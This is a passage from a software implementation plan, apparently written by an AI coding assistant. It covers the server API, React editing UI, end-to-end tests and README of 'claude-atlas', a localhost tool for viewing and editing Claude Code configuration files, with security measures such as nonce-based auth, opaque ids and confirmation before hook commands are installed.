    expect(mem.items.some((i) => i.path.endsWith('NOTES.md'))).toBe(true)
  })

  it('gives every item an opaque id, not a path', async () => {
    const inv = await (await call('/api/inventory')).json()
    const ids = inv.groups.flatMap((g) => g.items.map((i) => i.id))
    expect(ids.every((id) => /^[0-9a-f]{16}$/.test(id))).toBe(true)
  })

  it('rejects an unauthenticated GET', async () => {
    expect((await fetch(base + '/api/inventory')).status).toBe(403)
  })

  it('reads and writes an artifact by id', async () => {
    const inv = await (await call('/api/inventory')).json()
    const item = inv.groups.flatMap((g) => g.items).find((i) => i.path.endsWith('NOTES.md'))
    const read = await (await call('/api/read', { method: 'POST', body: JSON.stringify({ id: item.id }) })).json()
    expect(read.content).toContain('# RTK')
    const w = await call('/api/write', {
      method: 'POST',
      body: JSON.stringify({ id: item.id, content: '# RTK v2\n', etag: read.etag }),
    })
    expect((await w.json()).ok).toBe(true)
    expect(fs.readFileSync(path.join(root, 'NOTES.md'), 'utf8')).toBe('# RTK v2\n')
  })

  it('returns 404 for an unknown id rather than touching the filesystem', async () => {
    const r = await call('/api/read', { method: 'POST', body: JSON.stringify({ id: 'deadbeefdeadbeef' }) })
    expect(r.status).toBe(404)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/api.test.js`
Expected: FAIL — cannot resolve `../src/server/index.js`.

- [ ] **Step 3: Write `src/server/api.js`**

```js
import crypto from 'node:crypto'
import path from 'node:path'
import { readSkills } from './readers/skills.js'
import { readMemory, flattenMemory } from './readers/memory.js'
import { readSettings, extractScripts } from './readers/settings.js'
import { readPlugins } from './readers/plugins.js'
import { classify } from './writability.js'

const handleFor = (p) => crypto.createHash('sha256').update(p).digest('hex').slice(0, 16)

export function buildInventory(root) {
  const table = new Map()
  const groups = []
  const denied = []

  const add = (kind, entries) => {
    const items = entries.map((e) => {
      const id = handleFor(e.path)
      table.set(id, { path: e.path, kind })
      return { id, kind, ...e, writability: classify({ path: e.path, kind, root }) }
    })
    groups.push({ kind, items })
  }

  const mem = readMemory(path.join(root, 'CLAUDE.md'))
  add('memory', flattenMemory(mem)
    .filter((n) => n.state === 'ok')
    .map((n) => ({ path: n.path, label: path.basename(n.path), bytes: n.bytes })))

  const s = readSettings(root)
  add('settings', s.result.state === 'ok'
    ? [{ path: s.path, label: 'settings.json', keys: Object.keys(s.result.value).length }]
    : [])

  const scripts = s.result.state === 'ok' ? extractScripts(s.result.value, root) : []
  add('scripts', scripts.filter((r) => r.scriptPath).map((r) => ({
    path: r.scriptPath, label: path.basename(r.scriptPath), keyPath: r.keyPath, command: r.command,
  })))

  const sk = readSkills(root)
  denied.push(...sk.denied)
  add('skill', sk.skills.map((x) => ({
    path: x.path, label: x.name, description: x.description, origin: x.origin, plugin: x.plugin,
  })))

  const pl = readPlugins(root)
  add('plugin', pl.plugins.map((p) => ({
    path: p.installPath, label: p.id, drift: p.drift,
    recordedVersion: p.recordedVersion, manifestVersion: p.manifestVersion, enabled: p.enabled,
  })))

  return {
    root,
    groups,
    denied,
    sources: [...sk.sources, ...pl.sources],
    table,
  }
}

export function makeScriptKind(kind) {
  return kind === 'scripts' ? 'hookScript' : kind
}
```

- [ ] **Step 4: Write `src/server/index.js`**

```js
import http from 'node:http'
import fs from 'node:fs'
import path from 'node:path'
import { createSecurity } from './security.js'
import { buildInventory, makeScriptKind } from './api.js'
import { readForEdit, writeArtifact } from './writer.js'

const json = (res, status, body, headers = {}) => {
  res.writeHead(status, { 'content-type': 'application/json', ...headers })
  res.end(JSON.stringify(body))
}

const readBody = (req) => new Promise((resolve, reject) => {
  let data = ''
  req.on('data', (c) => {
    data += c
    if (data.length > 5_000_000) reject(new Error('body too large'))
  })
  req.on('end', () => resolve(data))
  req.on('error', reject)
})

export function createServer({ root, distDir }) {
  return new Promise((resolve, reject) => {
    let security
    let inventory = null

    const server = http.createServer(async (req, res) => {
      const headers = security.cspHeaders()
      for (const [k, v] of Object.entries(headers)) res.setHeader(k, v)

      const url = new URL(req.url, `http://${req.headers.host ?? '127.0.0.1'}`)

      if (url.pathname === '/' && url.searchParams.has('n')) {
        if (security.issueCookie(req, res)) {
          res.writeHead(200, { 'content-type': 'text/html' })
          const index = distDir ? fs.readFileSync(path.join(distDir, 'index.html'), 'utf8') : '<!doctype html><title>claude-atlas</title>'
          return res.end(index)
        }
        return json(res, 403, { error: 'bad or used nonce' })
      }

      const verdict = security.check(req)
      if (!verdict.ok) return json(res, verdict.status, { error: verdict.reason })

      if (url.pathname === '/api/inventory') {
        inventory = buildInventory(root)
        const { table, ...safe } = inventory
        return json(res, 200, safe)
      }

      if (url.pathname === '/api/read' && req.method === 'POST') {
        const { id } = JSON.parse(await readBody(req))
        if (!inventory) inventory = buildInventory(root)
        const entry = inventory.table.get(id)
        if (!entry) return json(res, 404, { error: 'unknown id' })
        const { content, etag } = readForEdit(entry.path)
        return json(res, 200, { content, etag, path: entry.path, kind: entry.kind })
      }

      if (url.pathname === '/api/write' && req.method === 'POST') {
        const body = JSON.parse(await readBody(req))
        if (!inventory) inventory = buildInventory(root)
        const entry = inventory.table.get(body.id)
        if (!entry) return json(res, 404, { error: 'unknown id' })
        const result = writeArtifact({
          target: entry.path,
          content: body.content,
          etag: body.etag,
          kind: makeScriptKind(entry.kind),
          root,
          confirmToken: body.confirmToken,
        })
        return json(res, result.ok ? 200 : 409, result)
      }

      if (distDir && req.method === 'GET') {
        const rel = url.pathname === '/' ? 'index.html' : url.pathname.slice(1)
        const file = path.join(distDir, rel)
        if (file.startsWith(distDir) && fs.existsSync(file)) {
          res.writeHead(200)
          return res.end(fs.readFileSync(file))
        }
      }
      return json(res, 404, { error: 'not found' })
    })

    server.on('error', reject)
    server.listen(0, '127.0.0.1', () => {
      const { port } = server.address()
      security = createSecurity({ port })
      resolve({ server, security, url: `http://127.0.0.1:${port}/?n=${security.nonce}` })
    })
  })
}
```

- [ ] **Step 5: Write `bin/claude-atlas.js`**

```js
#!/usr/bin/env node
import path from 'node:path'
import { fileURLToPath } from 'node:url'
import { createServer } from '../src/server/index.js'
import { resolveRoot } from '../src/server/roots.js'

const here = path.dirname(fileURLToPath(import.meta.url))
const root = resolveRoot(process.env, process.env.HOME)

try {
  const { url } = await createServer({ root, distDir: path.join(here, '..', 'dist') })
  console.log(`claude-atlas — reading ${root.path} (${root.source})`)
  console.log(url)
} catch (err) {
  if (err.code === 'EADDRINUSE') {
    console.error('Could not bind a local port. Refusing to fall back — see spec §9.1.')
    process.exit(1)
  }
  throw err
}
```

- [ ] **Step 6: Fix the root argument**

`resolveRoot` returns `{path, source}` but `createServer` expects a string. In `bin/claude-atlas.js`, change the call to:

```js
  const { url } = await createServer({ root: root.path, distDir: path.join(here, '..', 'dist') })
```

- [ ] **Step 7: Run test to verify it passes**

Run: `npx vitest run tests/api.test.js`
Expected: PASS, 6 tests.

- [ ] **Step 8: Commit**

```bash
git add src/server/api.js src/server/index.js bin/claude-atlas.js tests/api.test.js
git commit -m "feat: inventory API with opaque ids and ephemeral-port server

Ids are scan-time handles, never path-derived, so traversal via id is not
expressible. EADDRINUSE is fatal. Spec §9.1, §9.4."
```

---

### Task 13: UI — the "Loaded now" screen with inline editing

**Files:**
- Create: `src/ui/index.html`, `src/ui/main.jsx`, `src/ui/App.jsx`, `src/ui/Editor.jsx`, `src/ui/app.module.css`
- Test: `tests/ui-render.test.js`

**Interfaces:**
- Consumes: `/api/inventory`, `/api/read`, `/api/write`.
- Produces: the SPA. No exported JS interface.

- [ ] **Step 1: Write the failing test**

Create `tests/ui-render.test.js`:

```js
import { describe, it, expect } from 'vitest'
import fs from 'node:fs'
import path from 'node:path'

const uiFiles = ['index.html', 'main.jsx', 'App.jsx', 'Editor.jsx', 'app.module.css']

describe('ui source', () => {
  it('has all expected files', () => {
    for (const f of uiFiles) {
      expect(fs.existsSync(path.join('src/ui', f)), f).toBe(true)
    }
  })

  it('never uses innerHTML or dangerouslySetInnerHTML', () => {
    for (const f of uiFiles) {
      const src = fs.readFileSync(path.join('src/ui', f), 'utf8')
      expect(src, f).not.toMatch(/innerHTML|dangerouslySetInnerHTML/)
    }
  })

  it('renders the four states rather than a bare count', () => {
    const src = fs.readFileSync('src/ui/App.jsx', 'utf8')
    for (const state of ['absent', 'empty', 'denied', 'malformed']) {
      expect(src, state).toContain(state)
    }
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/ui-render.test.js`
Expected: FAIL — files do not exist.

- [ ] **Step 3: Create `src/ui/index.html`**

```html
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>claude-atlas</title>
  </head>
  <body>
    <div id="root"></div>
    <script type="module" src="./main.jsx"></script>
  </body>
</html>
```

- [ ] **Step 4: Create `src/ui/main.jsx`**

```jsx
import React from 'react'
import { createRoot } from 'react-dom/client'
import App from './App.jsx'

// Strip the launch nonce from the address bar; the cookie now carries auth.
if (new URL(window.location.href).searchParams.has('n')) {
  window.history.replaceState({}, '', window.location.pathname)
}

createRoot(document.getElementById('root')).render(<App />)
```

- [ ] **Step 5: Create `src/ui/App.jsx`**

```jsx
import React, { useEffect, useState } from 'react'
import Editor from './Editor.jsx'
import s from './app.module.css'

const post = (url, body) =>
  fetch(url, {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify(body),
  }).then((r) => r.json())

function SourceState({ report }) {
  const copy = {
    absent: `No ${report.label} directory — nothing is configured there`,
    empty: `${report.label}: empty`,
    denied: `${report.label}: present, unreadable`,
    malformed: `${report.label}: parse error`,
    ok: null,
  }[report.state]
  return copy ? <li className={s.note}>{copy}</li> : null
}

export default function App() {
  const [inv, setInv] = useState(null)
  const [open, setOpen] = useState(null)

  useEffect(() => {
    fetch('/api/inventory').then((r) => r.json()).then(setInv)
  }, [])

  if (!inv) return <p className={s.note}>Loading…</p>

  return (
    <main className={s.page}>
      <header className={s.header}>
        <h1>claude-atlas</h1>
        <p className={s.note}>{inv.root}</p>
      </header>

      {inv.sources?.length > 0 && (
        <ul className={s.sources}>
          {inv.sources.map((r) => <SourceState key={r.label + r.dir} report={r} />)}
        </ul>
      )}

      {inv.denied?.length > 0 && (
        <p className={s.warn}>
          {inv.denied.length} directories unreadable (macOS privacy protection) — grant Full Disk
          Access to see them.
        </p>
      )}

      {inv.groups.map((g) => (
        <section key={g.kind} className={s.group}>
          <h2>{g.kind} <span className={s.count}>{g.items.length}</span></h2>
          <ul>
            {g.items.map((item) => (
              <li key={item.id} className={s.row}>
                <button className={s.name} onClick={() => setOpen(item)}>{item.label}</button>
                <span className={s.meta}>{item.plugin ?? item.origin ?? ''}</span>
                {item.drift === 'drifted' && <span className={s.drift}>drift</span>}
                <span className={s.klass}>{item.writability.class}</span>
              </li>
            ))}
          </ul>
        </section>
      ))}

      {open && <Editor item={open} post={post} onClose={() => setOpen(null)} />}
    </main>
  )
}
```

- [ ] **Step 6: Create `src/ui/Editor.jsx`**

```jsx
import React, { useEffect, useState } from 'react'
import s from './app.module.css'

export default function Editor({ item, post, onClose }) {
  const [doc, setDoc] = useState(null)
  const [text, setText] = useState('')
  const [status, setStatus] = useState(null)
  const [confirm, setConfirm] = useState(null)

  useEffect(() => {
    post('/api/read', { id: item.id }).then((d) => { setDoc(d); setText(d.content) })
  }, [item.id])

  const save = async (confirmToken) => {
    const r = await post('/api/write', { id: item.id, content: text, etag: doc.etag, confirmToken })
    if (r.ok) { setStatus(`Saved. Backup: ${r.backup}`); setConfirm(null); return }
    if (r.error === 'confirmation_required') { setConfirm(r); return }
    setStatus(`${r.error}: ${r.reason ?? ''}`)
  }

  const cls = item.writability.class
  const editable = cls === 'free' || cls === 'exec'

  return (
    <div className={s.editor}>
      <div className={s.editorHead}>
        <strong>{item.label}</strong>
        <button onClick={onClose}>close</button>
      </div>
      <p className={s.note}>{item.writability.reason}</p>

      {!doc && <p className={s.note}>Loading…</p>}
      {doc && (
        <textarea
          className={s.textarea}
          value={text}
          readOnly={!editable}
          onChange={(e) => setText(e.target.value)}
          spellCheck={false}
        />
      )}

      {confirm && (
        <div className={s.warn}>
          <p>This change installs a command that Claude Code will execute:</p>
          <ul>
            {confirm.changes.map((c) => (
              <li key={c.keyPath}><code>{c.keyPath}</code>: {String(c.before)} → {String(c.after)}</li>
            ))}
          </ul>
          <button onClick={() => save(confirm.confirmToken)}>I understand — install it</button>
        </div>
      )}

      {editable && !confirm && doc && <button onClick={() => save()}>Save</button>}
      {status && <p className={s.note}>{status}</p>}
    </div>
  )
}
```

- [ ] **Step 7: Create `src/ui/app.module.css`**

```css
.page { font: 14px/1.5 ui-sans-serif, system-ui, sans-serif; max-width: 60rem; margin: 2rem auto; padding: 0 1rem; }
.header h1 { font-size: 1.1rem; margin: 0; }
.note { color: #6b6b6b; font-size: 0.85rem; }
.warn { background: #fff4e5; border: 1px solid #e0b070; padding: 0.6rem; border-radius: 4px; }
.sources { list-style: none; padding: 0; }
.group { margin: 1.5rem 0; }
.group h2 { font-size: 0.95rem; border-bottom: 1px solid #e5e5e5; padding-bottom: 0.3rem; }
.group ul { list-style: none; padding: 0; margin: 0; }
.count { color: #999; font-weight: normal; }
.row { display: flex; gap: 0.6rem; align-items: baseline; padding: 0.25rem 0; }
.name { background: none; border: none; padding: 0; color: #1a5fb4; cursor: pointer; font: inherit; }
.meta { color: #888; font-size: 0.8rem; }
.drift { background: #ffe0e0; color: #a00; font-size: 0.7rem; padding: 0 0.3rem; border-radius: 3px; }
.klass { margin-left: auto; color: #888; font-size: 0.75rem; }
.editor { position: fixed; right: 0; top: 0; bottom: 0; width: min(46rem, 60vw); background: #fff;
  border-left: 1px solid #ddd; padding: 1rem; overflow: auto; }
.editorHead { display: flex; justify-content: space-between; align-items: center; }
.textarea { width: 100%; height: 60vh; font: 12px/1.5 ui-monospace, monospace; }
```

- [ ] **Step 8: Run test to verify it passes**

Run: `npx vitest run tests/ui-render.test.js`
Expected: PASS, 3 tests.

- [ ] **Step 9: Verify the build and lint**

Run: `npm run build && npm run lint`
Expected: `dist/` produced; ESLint reports no errors (the `innerHTML` rule is what matters).

- [ ] **Step 10: Commit**

```bash
git add src/ui tests/ui-render.test.js
git commit -m "feat: Loaded Now screen with inline editor

Renders absent/empty/denied/malformed distinctly rather than a bare count,
and surfaces the exec confirmation with the before/after command. Spec §11."
```

---

### Task 14: End-to-end verification against the real machine

This task proves the Phase 1 exit criterion from spec §13.

**Files:**
- Create: `tests/e2e-real.test.js`
- Create: `README.md`

**Interfaces:**
- Consumes: everything.
- Produces: nothing.

- [ ] **Step 1: Write the end-to-end test**

Create `tests/e2e-real.test.js`:

```js
import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { createServer } from '../src/server/index.js'

// Snapshot of the author's real shape, so this runs anywhere.
let root, handle, base, cookie
beforeAll(async () => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'atlas-e2e-'))
  fs.writeFileSync(path.join(root, 'CLAUDE.md'), '@NOTES.md\n')
  fs.writeFileSync(path.join(root, 'NOTES.md'), '# RTK\n\nToken killer.\n')
  fs.mkdirSync(path.join(root, 'hooks'))
  fs.writeFileSync(path.join(root, 'hooks/format-hook.sh'), '#!/bin/bash\necho hi\n')
  fs.writeFileSync(path.join(root, 'settings.json'), JSON.stringify({
    model: 'claude-opus-5',
    hooks: { PreToolUse: [{ hooks: [{ type: 'command', command: `bash ${path.join(root, 'hooks/format-hook.sh')}` }] }] },
  }, null, 2))
  const skill = path.join(root, 'plugins/cache/spyglass/spyglass/0.1.0/skills/spyglass')
  fs.mkdirSync(skill, { recursive: true })
  fs.writeFileSync(path.join(skill, 'SKILL.md'), '---\nname: spyglass\ndescription: d\n---\n')

  handle = await createServer({ root, distDir: null })
  base = handle.url.split('?')[0].replace(/\/$/, '')
  cookie = (await fetch(handle.url)).headers.getSetCookie().join('; ')
})
afterAll(() => { handle.server.close(); fs.rmSync(root, { recursive: true, force: true }) })

const call = (p, init = {}) => fetch(base + p, {
  ...init,
  headers: { origin: base, cookie, 'content-type': 'application/json', ...(init.headers ?? {}) },
})

describe('phase 1 exit criteria', () => {
  it('shows plugin skills even though ~/.claude/skills does not exist', async () => {
    const inv = await (await call('/api/inventory')).json()
    expect(inv.groups.find((g) => g.kind === 'skill').items).toHaveLength(1)
    expect(inv.sources.find((s) => s.label === 'user').state).toBe('absent')
  })

  it('shows the hook script body as an artifact', async () => {
    const inv = await (await call('/api/inventory')).json()
    expect(inv.groups.find((g) => g.kind === 'scripts').items[0].label).toBe('format-hook.sh')
  })

  it('edits NOTES.md in place and leaves a backup', async () => {
    const inv = await (await call('/api/inventory')).json()
    const rtk = inv.groups.flatMap((g) => g.items).find((i) => i.path.endsWith('NOTES.md'))
    const read = await (await call('/api/read', { method: 'POST', body: JSON.stringify({ id: rtk.id }) })).json()
    const w = await (await call('/api/write', {
      method: 'POST', body: JSON.stringify({ id: rtk.id, content: '# RTK edited\n', etag: read.etag }),
    })).json()
    expect(w.ok).toBe(true)
    expect(fs.readFileSync(path.join(root, 'NOTES.md'), 'utf8')).toBe('# RTK edited\n')
    expect(fs.existsSync(w.backup)).toBe(true)
  })

  it('refuses a settings.json write when the file changed under us', async () => {
    const inv = await (await call('/api/inventory')).json()
    const st = inv.groups.flatMap((g) => g.items).find((i) => i.path.endsWith('settings.json'))
    const read = await (await call('/api/read', { method: 'POST', body: JSON.stringify({ id: st.id }) })).json()
    fs.writeFileSync(path.join(root, 'settings.json'), '{"model":"claude-sonnet-5"}')
    const w = await (await call('/api/write', {
      method: 'POST', body: JSON.stringify({ id: st.id, content: '{"model":"mine"}', etag: read.etag }),
    })).json()
    expect(w.ok).toBe(false)
    expect(w.error).toBe('conflict')
  })
})
```

- [ ] **Step 2: Run test to verify it fails, then passes**

Run: `npx vitest run tests/e2e-real.test.js`
Expected: PASS, 4 tests. (If any fail, the defect is in an earlier task — fix there, not here.)

- [ ] **Step 3: Run the whole suite**

Run: `npm test`
Expected: all test files pass; no skipped suites.

- [ ] **Step 4: Launch against the real config and confirm by eye**

Run: `node bin/claude-atlas.js`
Then open the printed URL. Confirm:
- skills group shows **~23** items, each attributed to a plugin
- a note reads *"No skills directory — nothing is configured there"* (not "0 skills")
- memory group shows **CLAUDE.md** *and* **NOTES.md**
- scripts group shows **format-hook.sh** and **statusline-command.sh**
- plugins group shows **10**, with exactly **one** `drift` badge (spyglass)
- editing `NOTES.md` and saving writes the file and reports a backup path

Stop the server with Ctrl-C.

- [ ] **Step 5: Write `README.md`**

```markdown
# claude-atlas

See and edit every Claude Code artifact on your machine, at global scope.

    npx claude-atlas

Opens a local web UI on an ephemeral `127.0.0.1` port. Reads
`$CLAUDE_CONFIG_DIR` if set, otherwise `~/.claude`.

## Phase 1 scope

Shows skills (including the plugin-delivered ones no other tool finds),
memory with `@`-imports resolved, `settings.json`, hook and statusline
script bodies, and installed plugins with drift status. Lets you edit
anything safe to edit.

Not yet: project scope, token costs, sessions, deletion.

## Safety

- Binds `127.0.0.1` only. No tunnel, no LAN, no remote mode.
- Every API request needs a cookie issued from a single-use launch nonce,
  plus matching `Origin` and `Host`. Missing headers are rejected.
- Writes that install an executable command require a second confirmation
  naming the exact command.
- Every write is backed up beside the original at mode `0600` and performed
  under a lockfile with a compare-and-swap against the on-disk content.

## Development

    npm install
    npm test
    npm run build
```

- [ ] **Step 6: Commit**

```bash
git add tests/e2e-real.test.js README.md
git commit -m "test: end-to-end verification of Phase 1 exit criteria

Proves plugin skills render when ~/.claude/skills is absent, @-imports
resolve, hook script bodies appear, NOTES.md edits round-trip with a backup,
and a settings.json write refuses cleanly when the file changed underneath.
Spec §13."
```

---

## Self-Review

**Spec coverage (§13 Phase 1):**

| Spec requirement | Task |
|---|---|
| Security baseline (§9.1 ephemeral port, §9.2 nonce→cookie/fail-closed, §9.5 CSP + innerHTML ban) | 1, 11, 12 |
| Single root, `CLAUDE_CONFIG_DIR` (§6.1) | 2 |
| Config-driven reader table (§4.1) | 4, 5, 6, 7 + `api.js` grouping in 12 |
| `@`-import resolution (§8.2) | 5 |
| Hook + statusline script bodies (§4.1) | 6 |
| One screen (§11 "Loaded now") | 13 |
| Inline editing, freely-editable class (§8.1) | 9, 10, 13 |
| Validation before write (§8.3) | 10 |
| Lockfile CAS (§8.4) | 10 |
| Beside-backups at 0600 (§8.6) | 10 |
| Value-shape write gate (§9.3) | 8, 10 |
| Opaque ids (§9.4) | 12 |
| absent ≠ empty ≠ denied ≠ malformed (§10) | 1, 3, 13 |
| Denied-directory reporting (§6.2) | 3, 13 |
| Exit criterion | 14 |

**Gaps accepted for Phase 1, per spec §13:** ScopeRegistry and project scope; Oracle and token costs; sessions; deletion; managed-policy sources; markdown rendering (Phase 1 uses a plain `textarea`, so `markdown-it`/`dompurify` are installed but unused until a later phase renders prose — the ESLint ban already guards the sink).

**Placeholder scan:** no TBD/TODO; every code step contains complete runnable code; no "similar to Task N" references.

**Type consistency check:** `resolveRoot` returns `{path, source}` — Task 12 Step 6 explicitly corrects the call site, since Step 5 writes it the natural (wrong) way. `Result.state` strings are identical across Tasks 1, 3, 4, 13. `classify` returns `{class, reason, redirectTo?}` and is consumed with `.class` in Tasks 10, 12, 13. `writeArtifact` error codes used in Task 13's UI (`confirmation_required`, `conflict`, `redirect`) all exist in Task 10. `readForEdit` returns `{content, etag}`, consumed identically in Tasks 12 and 14.

---

**Plan complete and saved to `docs/superpowers/plans/2026-09-11-phase-1-loaded-now.md`. Two execution options:**

**1. Subagent-Driven (recommended)** — I dispatch a fresh subagent per task, review between tasks, fast iteration

**2. Inline Execution** — Execute tasks in this session using executing-plans, batch execution with checkpoints

**Which approach?**
